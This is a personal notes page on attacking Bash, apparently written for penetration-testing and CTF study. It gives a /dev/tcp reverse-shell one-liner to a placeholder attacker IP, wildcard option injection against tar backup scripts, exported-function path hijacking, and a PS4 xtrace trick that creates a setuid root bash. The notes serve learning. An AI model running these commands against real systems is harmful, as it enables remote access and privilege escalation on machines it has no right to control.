# Exploiting Bash

## A Simple Reverse Shell

```bash
bash -li &> /dev/tcp/$ATTACKER_IP/$LISTENER_PORT 0>&1
```

Catch it with [netcat](netcat.md) or [socat](socat.md).

(That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I *think* whatâ€™s happening here is that /dev/tcp is bidirectional â€œout of the boxâ€ â€” incoming data comes out, just as outgoing data goes in â€” so binding all three â€œcoreâ€ file descriptors to it does the right thing. That, and realize that the `X>&Y` construct means â€œbind file descriptor X to file descriptor Yâ€, and `&>` is just short for `2>&1 >`, and `>` is just short for `1 >`. So really whatâ€™s happening here is that we bind STDERR to STDOUT with and implicit `2>&1`, then bind STDOUT to /dev/tcp with an implicit `1 >`, then bind STDIN to /dev/tcp as well with `0>&1`.)

## Using Wildcard Expansion to Pass Command Line Options

The wildcard expansion (`*`) in Bash scripts doesnâ€™t get pushed to the command, but is instead expanded in place. This means that files named like command-line switches *will be interpreted as command line switches*. This can be used, for example, to exploit sloppy [tar](exploiting-tar.md)-based backup scripts.

## Exploiting Functions in Bash < 4.2-048

In versions of Bash < 4.2-048, itâ€™s possible to export functions with the same form as absolute paths to files. These functions will then be executed instead of the fully-specified path *if* the calling application is relying on the current shell for helper execution.

For example:

```bash
function /path/to/executable { /bin/bash -p; }
export -f /path/to/executable
```

## Exploiting PS4 in Bash < 4.4

When bash is in debugging mode (SHELLOPTS=xtrace), the PS4 prompt is used to display debugging information.

*It would appear that this prompt somehow inherits the permissions of the executable being run.* This includes SUID/SGID permissions (at least for Bash < 4.4)!

If you have access to a SUID/SGID executable, this can be abused to create root shells:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /path/to/suid/executable
```

Again, this only works *if* the calling application is relying on the current shell for helper execution.

## Avoid Dropping Privileges with SUID Bash

Bash will drop privileges by default if SUID. To avoid this, simply supply the `-p` flag. (Not sure how useful this is beyond CTFsâ€¦)

## References

* [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)

- - - -

ðŸ‘¤ Nathan Acks  
ðŸ“… October 29, 2021
